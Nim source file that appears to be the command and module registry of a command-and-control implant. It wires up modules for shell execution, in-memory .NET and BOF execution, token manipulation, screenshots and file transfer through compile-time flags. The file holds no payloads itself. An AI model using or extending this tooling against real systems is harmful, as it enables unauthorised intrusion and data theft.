import tables, strformat
import ../common/types

const MODULES* {.intdefine.} = 0

type
    ModuleManager* = object 
        modules*: seq[Module]
        commandsByType*: Table[CommandType, Command]
        commandsByName*: Table[string, Command]

var manager: ModuleManager

proc registerModule(module: Module) {.discardable.} = 
    manager.modules.add(module)
    for cmd in module.commands: 
        manager.commandsByType[cmd.commandType] = cmd
        manager.commandsByName[cmd.name] = cmd

proc registerCommands(commands: seq[Command]) {.discardable.} = 
    for cmd in commands: 
        manager.commandsByType[cmd.commandType] = cmd
        manager.commandsByName[cmd.name] = cmd 

# Modules/commands

import exit
registerCommands(exit.commands)

# Import all modules
when (MODULES == cast[uint32](MODULE_ALL)):
    import 
        sleep,
        shell,
        filesystem,
        filetransfer,
        bof,
        dotnet,
        screenshot,
        systeminfo,
        token
    registerModule(sleep.module)
    registerModule(shell.module)
    registerModule(bof.module)
    registerModule(dotnet.module)
    registerModule(filesystem.module)
    registerModule(filetransfer.module)
    registerModule(screenshot.module)
    registerModule(systeminfo.module)
    registerModule(token.module)

# Import modules individually 
when ((MODULES and cast[uint32](MODULE_SLEEP)) == cast[uint32](MODULE_SLEEP)):
    import sleep
    registerModule(sleep.module)
when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
    import shell
    registerModule(shell.module)
when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
    import bof 
    registerModule(bof.module)
when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
    import dotnet
    registerModule(dotnet.module)
when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILESYSTEM)):
    import filesystem
    registerModule(filesystem.module)
when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
    import filetransfer
    registerModule(filetransfer.module)
when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREENSHOT)):
    import screenshot
    registerModule(screenshot.module)
when ((MODULES and cast[uint32](MODULE_SITUATIONAL_AWARENESS)) == cast[uint32](MODULE_SITUATIONAL_AWARENESS)):
    import systeminfo
    registerModule(systeminfo.module)
when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
    import token
    registerModule(token.module)

proc getCommandByType*(cmdType: CommandType): Command = 
    return manager.commandsByType[cmdType]

proc getCommandByName*(cmdName: string): Command = 
    try:
        return manager.commandsByName[cmdName]
    except ValueError: 
        raise newException(ValueError, fmt"The command '{cmdName}' does not exist.")

proc getAvailableCommands*(): Table[string, Command] = 
    return manager.commandsByName

proc getModules*(modules: uint32 = 0): seq[Module] = 
    if modules == 0:
        return manager.modules
    else: 
        for m in manager.modules: 
            if (modules and cast[uint32](m.moduleType)) == cast[uint32](m.moduleType): 
                result.add(m)

proc getCommands*(modules: uint32 = 0): seq[Command] = 
    # House-keeping 
    result.add(manager.commandsByType[CMD_EXIT])

    # Modules
    if modules == 0:
        for m in manager.modules: 
            result.add(m.commands)
    else: 
        for m in manager.modules: 
            if (modules and cast[uint32](m.moduleType)) == cast[uint32](m.moduleType): 
                result.add(m.commands)